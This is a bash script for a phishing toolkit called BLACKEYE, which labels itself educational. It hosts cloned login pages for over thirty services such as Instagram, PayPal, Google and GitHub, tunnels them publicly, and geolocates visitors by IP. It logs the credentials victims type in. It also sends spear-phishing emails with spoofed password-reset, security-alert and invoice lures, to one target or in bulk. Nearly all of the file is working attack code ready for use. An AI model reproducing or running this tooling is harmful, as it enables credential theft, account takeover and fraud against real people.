#!/bin/bash

trap 'summary; stop; exit 0' INT

BASE_DIR="$(pwd)"
MASTER_LOG="$BASE_DIR/master_creds.log"
TEMPLATE_DIR="$BASE_DIR/templates"
SENT_LOG="$BASE_DIR/sent_log.txt"
SMTP_CONFIG="$BASE_DIR/smtp_config"
SEEN_IPS="$BASE_DIR/seen_ips.tmp"
CLOUDFLARED_BIN="$BASE_DIR/cloudflared"
mkdir -p "$TEMPLATE_DIR" "$BASE_DIR/drafts"
> "$SEEN_IPS"

UNIQUE_VISITORS=0
TOTAL_VISITORS=0
CAPTURED_CREDS=0
START_TIME=$(date +%s)

R=$'\033[1;31m' G=$'\033[1;32m' Y=$'\033[1;33m' C=$'\033[1;36m'
W=$'\033[1;37m' B=$'\033[1;34m' M=$'\033[1;35m' N=$'\033[0m'
DIM=$'\033[2m' BLINK=$'\033[5m'
BG_G=$'\033[1;42m\033[1;37m' BG_R=$'\033[1;41m\033[1;37m'

stop() {
    pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f ngrok > /dev/null 2>&1
}

summary() {
    local runtime=$(( $(date +%s) - START_TIME ))
    printf "\n\n%s──────────────────────────────────────────%s\n" "$M" "$N"
    printf "%s  SESSION SUMMARY%s\n" "$W" "$N"
    printf "%s  Runtime: %dm %ds  |  Visitors: %d unique  |  Creds: %d%s\n\n" "$W" $((runtime/60)) $((runtime%60)) $UNIQUE_VISITORS $CAPTURED_CREDS "$N"
}

banner() {
    clear
    printf "%s╔══════════════════════════════════════╗%s\n" "$R" "$N"
    printf "%s║%s          BLACKEYE                %s║%s\n" "$R" "$W" "$R" "$N"
    printf "%s║%s    Educational & learning tool   %s║%s\n" "$R" "$Y" "$R" "$N"
    printf "%s╚══════════════════════════════════════╝%s\n\n" "$R" "$N"
}

# ─── AUTO-DOWNLOAD CLOUDFLARED IF MISSING ───────────────
ensure_cloudflared() {
    if [[ -f "$CLOUDFLARED_BIN" ]] && [[ -x "$CLOUDFLARED_BIN" ]]; then
        return 0
    fi
    printf "%s[!] cloudflared not found. Downloading latest release...%s\n" "$Y" "$N"
    local url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    curl -sLo "$CLOUDFLARED_BIN" "$url" && chmod +x "$CLOUDFLARED_BIN"
    if [[ -x "$CLOUDFLARED_BIN" ]]; then
        printf "%s[✓] cloudflared downloaded and ready.%s\n" "$G" "$N"
    else
        printf "%s[✗] Failed to download cloudflared. Use Ngrok or Localhost instead.%s\n" "$R" "$N"
        return 1
    fi
}

fetch_geo() {
    local ip="$1"
    local data
    data=$(curl --silent --connect-timeout 3 "http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,proxy,hosting")
    [[ -z "$data" ]] && return 1
    python3 -c "
import sys, json
try:
    d = json.loads(sys.argv[1])
    if d.get('status') != 'success':
        sys.exit(1)
    print(d.get('city','') + '|' + d.get('regionName','') + '|' + d.get('country','') + '|' + d.get('isp','') + '|' + d.get('org','') + '|' + str(d.get('proxy',False)) + '|' + str(d.get('hosting',False)))
except:
    sys.exit(1)
" "$data" 2>/dev/null
}

start_phish() {
    local server="$1"
    local site_dir="$BASE_DIR/sites/$server"
    if [[ ! -d "$site_dir" ]]; then
        printf "%s[!] Site '%s' not found.%s\n" "$R" "$server" "$N"
        read -p "Press Enter..." ; return
    fi

    printf "\n%s[*] Tunnel method:%s\n" "$B" "$N"
    printf "  %s[1]%s Cloudflare  %s[2]%s Ngrok  %s[3]%s Localhost\n" "$G" "$N" "$G" "$N" "$G" "$N"
    read -p "  ${C}[?] Choice: ${N}" method
    case $method in
        2) METHOD="ngrok" ;;
        3) METHOD="localhost" ;;
        *) METHOD="cloudflare" ;;
    esac

    stop
    rm -f "$BASE_DIR/cloudflare.log" "$BASE_DIR/ngrok.log"
    : > "$site_dir/usernames.txt"
    : > "$site_dir/ip.txt"

    printf "%s[+] Starting PHP Server...%s\n" "$G" "$N"
    cd "$site_dir" && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2

    link=""
    case $METHOD in
        cloudflare)
            ensure_cloudflared || { read -p "Press Enter..." ; return; }
            printf "%s[+] Cloudflare tunnel starting...%s\n" "$G" "$N"
            "$CLOUDFLARED_BIN" tunnel --url http://127.0.0.1:3333 > "$BASE_DIR/cloudflare.log" 2>&1 &
            local waited=0
            while [[ -z "$link" && $waited -lt 30 ]]; do
                sleep 2
                link=$(grep -oP 'https://[-\w]*\.trycloudflare\.com' "$BASE_DIR/cloudflare.log" | head -n 1)
                ((waited+=2))
            done
            ;;
        ngrok)
            if ! command -v ngrok &>/dev/null; then
                printf "%s[!] ngrok not found. Install it or choose another method.%s\n" "$R" "$N"
                read -p "Press Enter..." ; return
            fi
            printf "%s[+] ngrok starting...%s\n" "$G" "$N"
            ngrok http 3333 --log=stdout > "$BASE_DIR/ngrok.log" 2>&1 &
            local waited=0
            while [[ -z "$link" && $waited -lt 15 ]]; do
                link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null)
                sleep 1
                ((waited++))
            done
            ;;
        localhost)
            link="http://127.0.0.1:3333"
            ;;
    esac

    if [[ -z "$link" ]]; then
        printf "%s[!] Failed to obtain public URL.%s\n" "$R" "$N"
        stop; read -p "Press Enter..." ; return
    fi

    printf "\n%s[✦] TARGET: %s%s%s\n" "$G" "$W" "$(echo $server | tr '[:lower:]' '[:upper:]')" "$N"
    printf "%s[✦] STATUS: %sREADY%s\n" "$G" "$W" "$N"
    printf "%s[✦] URL:    %s%s%s\n" "$G" "$C" "$link" "$N"
    printf "  %sWaiting for visits... Ctrl+C to stop%s\n\n" "$DIM" "$N"

    while true; do
        if [[ -s "$site_dir/ip.txt" ]]; then
            local line=$(head -n 1 "$site_dir/ip.txt")
            local raw_ip=$(echo "$line" | grep -oP 'IP:\s*\K[^\s|]+')
            local ua=$(echo "$line" | grep -oP 'User-Agent:\s*\K.*')
            ((TOTAL_VISITORS++))

            if [[ -n "$raw_ip" ]] && ! grep -Fxq "$raw_ip" "$SEEN_IPS"; then
                echo "$raw_ip" >> "$SEEN_IPS"
                ((UNIQUE_VISITORS++))
                printf "%s[%s] NEW VISITOR: %s%s%s\n" "$Y" "$(date +%T)" "$W" "$raw_ip" "$N"

                local geo=$(fetch_geo "$raw_ip")
                if [[ -n "$geo" ]]; then
                    IFS='|' read -r city region country isp org proxy hosting <<< "$geo"
                    printf "%s  City: %s%s  |  %sRegion: %s%s  |  %sCountry: %s%s%s\n" "$W" "$G" "$city" "$W" "$G" "$region" "$W" "$G" "$country" "$N"
                    printf "%s  ISP: %s%s%s\n" "$W" "$G" "$isp" "$N"
                    [[ -n "$org" ]] && printf "%s  Org: %s%s%s\n" "$W" "$G" "$org" "$N"
                    [[ "$proxy" == "True" ]] && printf "%s  Proxy/VPN: %sYes%s\n" "$W" "$Y" "$N"
                    [[ "$hosting" == "True" ]] && printf "%s  Hosting/DC: %sYes%s\n" "$W" "$Y" "$N"
                fi

                if [[ -n "$ua" ]]; then
                    local device=""
                    case "$ua" in
                        *iPhone*) device="iPhone" ;;
                        *Android*) device="Android" ;;
                        *Windows\ NT*) device="Windows" ;;
                        *Mac\ OS*) device="macOS" ;;
                        *Linux*) device="Linux" ;;
                    esac
                    [[ -n "$device" ]] && printf "%s  Device: %s%s%s\n" "$W" "$G" "$device" "$N"
                fi
                printf "\n"
            fi
            : > "$site_dir/ip.txt"
        fi

        if [[ -s "$site_dir/usernames.txt" ]]; then
            ((CAPTURED_CREDS++))
            printf "\n%s  ╔══════════════════════════════════════╗%s\n" "$BG_R" "$N"
            printf "%s  ║        CREDENTIALS CAPTURED          ║%s\n" "$BG_R" "$N"
            printf "%s  ╚══════════════════════════════════════╝%s\n" "$BG_R" "$N"
            while IFS= read -r credline; do
                printf "%s  → %s%s\n" "$G" "$credline" "$N"
            done < "$site_dir/usernames.txt"
            cat "$site_dir/usernames.txt" >> "$MASTER_LOG"
            : > "$site_dir/usernames.txt"
            printf "\n"
        fi
        sleep 1
    done
}

decode_html_entities() {
    sed -e 's/<[^>]*>//g' \
        -e 's/&amp;/\&/g' \
        -e 's/&lt;/</g' \
        -e 's/&gt;/>/g'
}

craft_email() {
    if [[ ! -f "$TEMPLATE_DIR/password_reset.html" ]]; then
        printf "%s[!] Email templates not found in %s.%s\n" "$R" "$TEMPLATE_DIR" "$N"
        printf "    Place the four .html files inside that folder.\n"
        read -p "Press Enter..." ; return
    fi

    banner
    printf "%s╔══════════════════════════════════════════╗%s\n" "$Y" "$N"
    printf "%s║     %sSPEAR-PHISH EMAIL CRAFTER       %s║%s\n" "$Y" "$W" "$Y" "$N"
    printf "%s╚══════════════════════════════════════════╝%s\n\n" "$Y" "$N"

    printf "%s[*] STEP 1: Email Account Setup%s\n" "$B" "$N"
    printf "%s──────────────────────────────────────────%s\n" "$W" "$N"
    printf "  %s[1]%s Gmail (App Pass)     %s[2]%s Outlook/Hotmail\n" "$G" "$N" "$G" "$N"
    printf "  %s[3]%s Yahoo                %s[4]%s Custom SMTP\n" "$G" "$N" "$G" "$N"
    printf "  %s[5]%s Use saved config\n\n" "$G" "$N"

    read -p "  ${C}[?] Select provider: ${N}" smtp_choice

    USE_SSL_DIRECT=false
    case $smtp_choice in
        1) SMTP_URL="smtp://smtp.gmail.com:587";  SMTP_FLAGS="--ssl-reqd" ;;
        2) SMTP_URL="smtp://smtp-mail.outlook.com:587"; SMTP_FLAGS="--ssl-reqd" ;;
        3) SMTP_URL="smtp://smtp.mail.yahoo.com:587"; SMTP_FLAGS="--ssl-reqd" ;;
        4) read -p "  ${C}[?] SMTP server:port: ${N}" custom_smtp
           if [[ "$custom_smtp" == *":465" ]]; then
               SMTP_URL="smtps://${custom_smtp%:465}"
               SMTP_FLAGS=""
               USE_SSL_DIRECT=true
           else
               SMTP_URL="smtp://${custom_smtp}"
               SMTP_FLAGS="--ssl-reqd"
           fi ;;
        5) if [[ -f "$SMTP_CONFIG" ]]; then
               source "$SMTP_CONFIG"
               printf "  %s[✓] Loaded: %s%s\n" "$G" "$FROM_EMAIL" "$N"
           else
               printf "  %s[!] No saved config.%s\n" "$Y" "$N"
               SMTP_URL="smtp://smtp.gmail.com:587"; SMTP_FLAGS="--ssl-reqd"
           fi ;;
        *) SMTP_URL="smtp://smtp.gmail.com:587"; SMTP_FLAGS="--ssl-reqd" ;;
    esac

    if [[ -z "$FROM_EMAIL" ]]; then
        read -p "  ${C}[?] Your email address: ${N}" FROM_EMAIL
        read -sp "  ${C}[?] Password / App Password: ${N}" FROM_PASS
        echo
        read -p "  ${C}[?] Display sender name: ${N}" SENDER_NAME
    fi

    read -p "  ${Y}[?] Save SMTP credentials? (y/n): ${N}" save_opt
    if [[ "$save_opt" == "y" ]]; then
        cat > "$SMTP_CONFIG" << EOF
SMTP_URL="$SMTP_URL"
SMTP_FLAGS="$SMTP_FLAGS"
FROM_EMAIL="$FROM_EMAIL"
FROM_PASS="$FROM_PASS"
SENDER_NAME="$SENDER_NAME"
USE_SSL_DIRECT="$USE_SSL_DIRECT"
EOF
        printf "  %s[✓] Saved%s\n" "$G" "$N"
    fi

    printf "\n  %s[*] Testing SMTP connection...%s\n" "$C" "$N"
    local test_tmp=$(mktemp)
    cat > "$test_tmp" << EOF
From: <$FROM_EMAIL>
To: <$FROM_EMAIL>
Subject: BLACKEYE SMTP test

Test connection for educational demonstration.
EOF
    local test_output=$(curl --silent --show-error \
        --url "$SMTP_URL" \
        $SMTP_FLAGS \
        --user "$FROM_EMAIL:$FROM_PASS" \
        --mail-from "$FROM_EMAIL" \
        --mail-rcpt "$FROM_EMAIL" \
        --upload-file "$test_tmp" 2>&1)
    local test_code=$?
    rm -f "$test_tmp"

    if [[ $test_code -ne 0 ]]; then
        printf "  %s[✗] SMTP FAILED (curl exit %d)%s\n" "$R" "$test_code" "$N"
        printf "  %sResponse: %s%s\n" "$DIM" "$test_output" "$N"
        printf "  %sTips:%s\n" "$Y" "$N"
        printf "   - Gmail: enable 2FA, generate App Password at myaccount.google.com/apppasswords\n"
        printf "   - Yahoo/Outlook: use App Password, not account password\n"
        printf "   - Try port 465: choose Custom SMTP, enter smtp.gmail.com:465\n"
        read -p "  Press Enter to return..."; return
    fi

    if echo "$test_output" | grep -qE "^(235|250|334)"; then
        printf "  %s[✓] SMTP authenticated%s\n" "$G" "$N"
    else
        printf "  %s[!] SMTP connected but response unclear:%s\n" "$Y" "$N"
        printf "  %s%s%s\n" "$DIM" "$(echo "$test_output" | tr '\n' ' ')" "$N"
    fi

    printf "\n%s[*] STEP 2: Choose Template%s\n" "$B" "$N"
    printf "%s──────────────────────────────────────────%s\n" "$W" "$N"
    printf "  %s[1]%s Password Reset     %s[4]%s Invoice/Payment\n" "$G" "$N" "$G" "$N"
    printf "  %s[2]%s Security Alert     %s[5]%s Custom Plaintext\n" "$G" "$N" "$G" "$N"
    printf "  %s[3]%s Shared Document    %s[6]%s Preview all\n\n" "$G" "$N" "$G" "$N"

    read -p "  ${C}[?] Template: ${N}" tmpl_choice
    CUSTOM_BODY=""; CUSTOM_SUBJECT=""
    case $tmpl_choice in
        1) TMPL_FILE="$TEMPLATE_DIR/password_reset.html" ;;
        2) TMPL_FILE="$TEMPLATE_DIR/security_alert.html" ;;
        3) TMPL_FILE="$TEMPLATE_DIR/shared_document.html" ;;
        4) TMPL_FILE="$TEMPLATE_DIR/invoice.html" ;;
        5) read -p "  ${C}[?] Subject: ${N}" CUSTOM_SUBJECT
           printf "  ${C}[?] Body (type END on new line to finish):${N}\n"
           CUSTOM_BODY=""
           while read -r line; do [[ "$line" == "END" ]] && break; CUSTOM_BODY+="$line\n"; done
           TMPL_FILE="" ;;
        6) for f in "$TEMPLATE_DIR"/*.html; do
               printf "\n  %s -- %s --%s\n" "$Y" "$(basename $f)" "$N"
               sed 's/<[^>]*>//g' "$f" | decode_html_entities | tr -s '\n' | head -8 | sed 's/^/   /'
               read -p "  ${C}[?] Use? (y/n/q): ${N}" pick
               [[ "$pick" == "q" ]] && break
               [[ "$pick" == "y" ]] && TMPL_FILE="$f" && break
           done ;;
    esac

    printf "\n%s[*] STEP 3: Target Details%s\n" "$B" "$N"
    printf "%s──────────────────────────────────────────%s\n" "$W" "$N"
    read -p "  ${C}[?] Target email: ${N}" TO_EMAIL
    read -p "  ${C}[?] Target name: ${N}" TARGET_NAME
    read -p "  ${C}[?] Company/platform they know: ${N}" COMPANY
    read -p "  ${C}[?] Phishing URL: ${N}" PHISH_LINK

    SPOOF_LOCATION="${SPOOF_LOCATION:-Unknown Location}"
    SPOOF_DEVICE="${SPOOF_DEVICE:-Windows 11 / Chrome 131}"
    TIMESTAMP="${TIMESTAMP:-$(date '+%b %d, %Y  %I:%M %p UTC')}"
    AMOUNT="${AMOUNT:-\$299.00}"
    INVOICE_NUM="${INVOICE_NUM:-INV-$(shuf -i 10000-99999 -n 1)}"
    DOC_NAME="${DOC_NAME:-Q4_Financial_Projections.pdf}"
    FILE_SIZE="${FILE_SIZE:-4.2 MB}"
    SHARE_TIME="${SHARE_TIME:-$(date '+%I:%M %p')}"
    [[ -z "$CUSTOM_SUBJECT" ]] && CUSTOM_SUBJECT="Important: Security Notice - ${COMPANY}"

    printf "\n%s[*] STEP 4: Generating Email...%s\n" "$B" "$N"
    printf "%s──────────────────────────────────────────%s\n" "$W" "$N"

    if [[ -n "$TMPL_FILE" ]]; then
        EMAIL_BODY=$(sed \
            -e "s|{{TARGET_NAME}}|$TARGET_NAME|g" \
            -e "s|{{COMPANY}}|$COMPANY|g" \
            -e "s|{{PHISH_LINK}}|$PHISH_LINK|g" \
            -e "s|{{SENDER_NAME}}|$SENDER_NAME|g" \
            -e "s|{{SENDER_EMAIL}}|$FROM_EMAIL|g" \
            -e "s|{{SPOOF_LOCATION}}|$SPOOF_LOCATION|g" \
            -e "s|{{SPOOF_DEVICE}}|$SPOOF_DEVICE|g" \
            -e "s|{{TIMESTAMP}}|$TIMESTAMP|g" \
            -e "s|{{AMOUNT}}|$AMOUNT|g" \
            -e "s|{{INVOICE_NUM}}|$INVOICE_NUM|g" \
            -e "s|{{DOC_NAME}}|$DOC_NAME|g" \
            -e "s|{{FILE_SIZE}}|$FILE_SIZE|g" \
            -e "s|{{SHARE_TIME}}|$SHARE_TIME|g" \
            "$TMPL_FILE")
    else
        EMAIL_BODY="$CUSTOM_BODY"
    fi

    printf "%s  From: %s%s <%s>%s\n" "$W" "$G" "$SENDER_NAME" "$FROM_EMAIL" "$N"
    printf "%s  To: %s%s%s\n" "$W" "$G" "$TO_EMAIL" "$N"
    printf "%s  Subject: %s%s%s\n" "$W" "$G" "$CUSTOM_SUBJECT" "$N"
    echo "$EMAIL_BODY" | decode_html_entities | tr -s '\n' | head -15 | sed 's/^/   /'
    printf "\n%s  ──────────────────────────────────────────%s\n" "$Y" "$N"

    printf "\n%s[*] STEP 5: Delivery%s\n" "$B" "$N"
    printf "%s──────────────────────────────────────────%s\n" "$W" "$N"
    printf "  %s[1]%s Send now (single)\n" "$G" "$N"
    printf "  %s[2]%s Send to bulk CSV\n" "$G" "$N"
    printf "  %s[3]%s Save draft & exit\n\n" "$G" "$N"

    read -p "  ${C}[?] Action: ${N}" send_choice

    send_single() {
        local to="$1" name="$2"
        local body=$(echo "$EMAIL_BODY" | sed "s|$TARGET_NAME|$name|g")
        local tmpfile=$(mktemp)
        local tracefile=$(mktemp)

        cat > "$tmpfile" << RAWEOF
From: "$SENDER_NAME" <$FROM_EMAIL>
To: <$to>
Subject: =?UTF-8?B?$(echo -n "$CUSTOM_SUBJECT" | base64 -w0)?=
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 8bit

$body
RAWEOF

        local curl_output=$(curl --silent --show-error \
            --url "$SMTP_URL" \
            $SMTP_FLAGS \
            --user "$FROM_EMAIL:$FROM_PASS" \
            --mail-from "$FROM_EMAIL" \
            --mail-rcpt "$to" \
            --upload-file "$tmpfile" \
            --trace-ascii "$tracefile" 2>&1)
        local exit_code=$?

        local smtp_250s=$(grep '^<= ' "$tracefile" | grep -E '^<= 250')
        local last_250=$(echo "$smtp_250s" | tail -1)

        rm -f "$tmpfile" "$tracefile"

        if [[ $exit_code -eq 0 ]] && [[ -n "$last_250" ]]; then
            printf "    %s[✓] DELIVERED → %s%s\n" "$G" "$to" "$N"
            echo "$(date '+%Y-%m-%d %H:%M') | $to | $name | $CUSTOM_SUBJECT | SMTP OK" >> "$SENT_LOG"
            return 0
        elif [[ $exit_code -eq 0 ]] && [[ -z "$last_250" ]]; then
            printf "    %s[~] SENT (check inbox) → %s%s\n" "$Y" "$to" "$N"
            echo "$(date '+%Y-%m-%d %H:%M') | $to | $name | $CUSTOM_SUBJECT | SENT unconfirmed" >> "$SENT_LOG"
            return 0
        else
            printf "    %s[✗] FAILED → %s%s\n" "$R" "$to" "$N"
            [[ -n "$curl_output" ]] && printf "    %sCurl: %s%s\n" "$DIM" "$curl_output" "$N"
            return 1
        fi
    }

    case $send_choice in
        1)
            printf "  %s[>] Sending to %s...%s\n\n" "$C" "$TO_EMAIL" "$N"
            send_single "$TO_EMAIL" "$TARGET_NAME"
            ;;
        2)
            read -p "  ${C}[?] Path to CSV (email,name): ${N}" CSV_PATH
            if [[ -f "$CSV_PATH" ]]; then
                total=$(wc -l < "$CSV_PATH")
                printf "  %s[>] Sending to %d targets...%s\n\n" "$C" "$total" "$N"
                ok=0; fail=0
                while IFS=',' read -r bulk_email bulk_name; do
                    [[ -z "$bulk_email" ]] && continue
                    if send_single "$bulk_email" "$bulk_name"; then ((ok++)); else ((fail++)); fi
                    printf "\r  %s[ok:%d fail:%d]%s" "$C" "$ok" "$fail" "$N"
                done < "$CSV_PATH"
                printf "\n\n%s  Done: %d sent, %d failed%s\n" "$G" "$ok" "$fail" "$N"
            else
                printf "  %s[!] File not found%s\n" "$R" "$N"
            fi
            ;;
        3)
            local draft="$BASE_DIR/drafts/$(date '+%Y%m%d_%H%M%S').eml"
            cat > "$draft" << EOF
From: "$SENDER_NAME" <$FROM_EMAIL>
To: <$TO_EMAIL>
Subject: $CUSTOM_SUBJECT
Date: $(date -R)
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

$EMAIL_BODY
EOF
            printf "  %s[✓] Saved to %s%s\n" "$G" "$draft" "$N"
            ;;
    esac

    printf "\n  %sPress Enter to return...%s" "$DIM" "$N"
    read
}

menu() {
    while true; do
        banner
        printf "%s  PHISHING PAGES%s\n" "$M" "$N"
        printf "%s [01]%s Instagram  %s[02]%s Facebook   %s[03]%s Google\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [04]%s Microsoft  %s[05]%s Netflix    %s[06]%s PayPal\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [07]%s Steam      %s[08]%s Twitter    %s[09]%s Spotify\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [10]%s Adobe      %s[11]%s Badoo      %s[12]%s Crypto\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [13]%s DeviantArt %s[14]%s Dropbox    %s[15]%s GitHub\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [16]%s GitLab     %s[17]%s LinkedIn   %s[18]%s Messenger\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [19]%s MySpace    %s[20]%s Origin     %s[21]%s Pinterest\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [22]%s ProtonMail %s[23]%s Shopify    %s[24]%s Snapchat\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [25]%s Shopping   %s[26]%s Twitch     %s[27]%s Verizon\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [28]%s VK         %s[29]%s WordPress  %s[30]%s Yahoo\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s [31]%s Yandex     %s[32]%s InstaFol   %s[33]%s Custom\n" "$G" "$N" "$G" "$N" "$G" "$N"
        printf "%s ─────────────────────────────────────────────%s\n" "$Y" "$N"
        printf "%s [E]%s  Spear-Phish Email Crafter%s\n" "$M" "$W" "$N"
        printf "%s [Q]%s  Exit%s\n\n" "$R" "$N"

        read -p " ${C}[*] SELECT: ${N}" choice

        case $choice in
            01|1)  start_phish "instagram" ;;
            02|2)  start_phish "facebook" ;;
            03|3)  start_phish "google" ;;
            04|4)  start_phish "microsoft" ;;
            05|5)  start_phish "netflix" ;;
            06|6)  start_phish "paypal" ;;
            07|7)  start_phish "steam" ;;
            08|8)  start_phish "twitter" ;;
            09|9)  start_phish "spotify" ;;
            10)    start_phish "adobe" ;;
            11)    start_phish "badoo" ;;
            12)    start_phish "cryptocurrency" ;;
            13)    start_phish "devianart" ;;
            14)    start_phish "dropbox" ;;
            15)    start_phish "github" ;;
            16)    start_phish "gitlab" ;;
            17)    start_phish "linkedin" ;;
            18)    start_phish "messenger" ;;
            19)    start_phish "myspace" ;;
            20)    start_phish "origin" ;;
            21)    start_phish "pinterest" ;;
            22)    start_phish "protonmail" ;;
            23)    start_phish "shopify" ;;
            24)    start_phish "snapchat" ;;
            25)    start_phish "shopping" ;;
            26)    start_phish "twitch" ;;
            27)    start_phish "verizon" ;;
            28)    start_phish "vk" ;;
            29)    start_phish "wordpress" ;;
            30)    start_phish "yahoo" ;;
            31)    start_phish "yandex" ;;
            32)    start_phish "instafollowers" ;;
            33)    read -p " ${C}[?] Site folder name: ${N}" custom_site; start_phish "$custom_site" ;;
            [eE])  craft_email ;;
            [qQ])  summary; stop; exit 0 ;;
        esac
    done
}

menu